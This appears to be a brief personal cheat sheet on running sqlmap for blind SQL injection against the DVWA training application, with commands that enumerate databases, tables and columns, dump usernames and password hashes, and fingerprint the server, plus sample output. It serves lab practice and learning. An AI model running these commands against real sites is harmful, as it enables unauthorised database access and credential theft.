## SQL-Injections 
[docs](https://github.com/sqlmapproject/sqlmap/wiki/Usage)
#### SQL (Blind) Injection example  
Blind SQL Injection is often used to build the database schema, and get all the data in the database. This is done using brute force techniques and does require many requests to be sent to the server.  

`sqlmap -u "url-of-attack" --cookie="full cookie name"`  

ex.  
`sqlmap -u 'http://localhost/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit#' --cookie="security=low; PHPSESSID=aadfsfsasfsdffsffsdfs"`  
options--
`--dbs`  list databases  
`-D dvwa --tables`  list all tables in the dvwa database  
`-T users --column`  list all columns in table users  
`-C user,password --dump` gets all usernames and password hashes 

#### more examples  
`sqlmap -u "http://example.com/?id=1&Submit=Submit#" --cookie="PHPSESSID=sdfsfsfsfsfslfjafj; security=low" --current-user --hostname --current-db --is-dba --thread=6`  
  
#####gives this info  
* `Linux Ubuntu`  
* `Apache 2.4.7, PHP 5.5.9`  
* `MySQL >= 5.0.12`  
* `root@localhost`    
* `dvwa`    
* `ip-10-20-40-33`    
* `True`    
